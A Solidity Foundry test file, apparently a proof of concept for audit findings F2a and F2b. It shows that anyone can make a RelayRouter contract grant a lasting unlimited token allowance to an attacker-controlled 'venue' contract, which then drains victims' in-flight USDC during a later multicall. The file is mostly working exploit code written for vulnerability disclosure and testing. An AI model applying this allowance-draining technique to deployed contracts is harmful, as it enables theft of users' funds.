// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {RelayRouter} from "periphery/RelayRouter.sol";
import {Call3Value} from "periphery/common/Multicall3.sol";

/// @notice Minimal mintable ERC20 for the PoC.
contract SimpleERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "allowance");
            allowance[from][msg.sender] = allowed - amount;
        }
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

/// @notice Attacker-controlled "venue" contract. Once the router has granted
/// it an allowance (via cleanupErc20sViaCall), any later call into it while
/// the router holds the token lets it pull the router's whole balance.
contract AttackerVenue {
    address public immutable attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    // Called by the router as part of a victim's multicall (e.g. the victim /
    // solver routed a swap through this venue). Instead of swapping, it
    // drains the router's in-flight balance using the stale allowance.
    function doSwap(address token) external returns (bool) {
        uint256 bal = IERC20(token).balanceOf(msg.sender);
        if (bal > 0) {
            IERC20(token).transferFrom(msg.sender, attacker, bal);
        }
        return true;
    }

    // Fallback so the priming cleanupErc20sViaCall (empty calldata) succeeds.
    fallback() external {}
    receive() external payable {}
}

contract RouterAllowanceTest is Test {
    RelayRouter router;
    SimpleERC20 usdc;
    AttackerVenue venue;

    address attacker = address(0xA77ACC);
    address victim = address(0xBEEF);

    function setUp() public {
        router = new RelayRouter();
        usdc = new SimpleERC20();
        venue = new AttackerVenue(attacker);
        usdc.mint(victim, 10_000 ether);
    }

    /// @notice F2a: anyone can get the router to approve ANY address for ANY
    /// amount of ANY token — even when the router holds zero of it — and the
    /// allowance is never reset afterwards.
    function test_allowancePersists_afterCleanupViaCall() public {
        address[] memory tokens = new address[](1);
        tokens[0] = address(usdc);
        address[] memory tos = new address[](1);
        tos[0] = address(venue);
        bytes[] memory datas = new bytes[](1);
        datas[0] = "";
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = type(uint256).max;

        assertEq(usdc.balanceOf(address(router)), 0, "router starts empty");

        vm.prank(attacker);
        router.cleanupErc20sViaCall(tokens, tos, datas, amounts);

        assertEq(
            usdc.allowance(address(router), address(venue)),
            type(uint256).max,
            "max allowance persists after the call"
        );
    }

    /// @notice F2b: full chain. The attacker primes a max allowance (F2a).
    /// Later, a victim's multicall routes USDC through the router and calls
    /// the attacker's venue (the precondition: the victim/solver includes the
    /// venue in the multicall). The venue drains the victim's in-flight USDC.
    function test_staleAllowance_drainsInflightVictimFunds() public {
        // Step 1: attacker primes the allowance (separate, earlier tx).
        {
            address[] memory tokens = new address[](1);
            tokens[0] = address(usdc);
            address[] memory tos = new address[](1);
            tos[0] = address(venue);
            bytes[] memory datas = new bytes[](1);
            datas[0] = "";
            uint256[] memory amounts = new uint256[](1);
            amounts[0] = type(uint256).max;
            vm.prank(attacker);
            router.cleanupErc20sViaCall(tokens, tos, datas, amounts);
        }

        // Step 2: victim flow (later tx) — USDC lands on the router (as the
        // approval proxy does), then the multicall invokes the venue.
        uint256 victimAmount = 1_000 ether;
        vm.prank(victim);
        usdc.transfer(address(router), victimAmount);

        Call3Value[] memory calls = new Call3Value[](1);
        calls[0] = Call3Value({
            target: address(venue),
            allowFailure: false,
            value: 0,
            callData: abi.encodeWithSelector(AttackerVenue.doSwap.selector, address(usdc))
        });

        vm.prank(victim);
        router.multicall(calls, victim, address(0), "");

        assertEq(usdc.balanceOf(attacker), victimAmount, "attacker drained in-flight USDC");
        assertEq(usdc.balanceOf(address(router)), 0, "router left empty");
        assertEq(usdc.balanceOf(victim), 10_000 ether - victimAmount, "victim got nothing back");
    }
}
